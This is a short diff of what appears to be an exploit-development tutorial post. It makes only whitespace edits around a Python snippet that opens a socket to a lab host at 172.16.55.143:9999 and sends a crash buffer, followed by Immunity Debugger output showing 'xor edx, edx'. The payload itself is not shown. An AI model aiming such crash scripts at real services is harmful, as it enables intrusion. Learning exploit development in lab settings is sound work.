@@ -391,9 +391,6 @@ s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("172.16.55.143", 9999))
 
 s.send(command+crash)
-
-
-
 ```
 
 Execution in Immunity:
@@ -401,6 +398,7 @@ Execution in Immunity:
 ```console
 xor edx, edx
 ```
+
 EDX is now zero.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/016.png" alt="">
